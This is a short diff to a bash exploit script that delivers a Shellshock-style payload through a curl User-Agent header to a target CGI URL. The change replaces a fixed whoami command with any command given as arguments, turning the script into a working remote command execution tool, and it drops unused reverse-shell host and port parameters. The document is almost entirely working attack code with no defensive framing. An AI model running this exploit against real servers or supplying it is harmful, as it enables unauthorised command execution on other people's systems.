@@ -1,7 +1,7 @@
 #!/bin/bash
+
 APP_URL="$1"
-REVERS_HOST="$2"
-REVERS_PORT="$3"
+shift 1 
+COMMAND="$@"
 
-
-curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; /usr/bin/whoami" ${APP_URL}
+curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; ${COMMAND}" ${APP_URL}
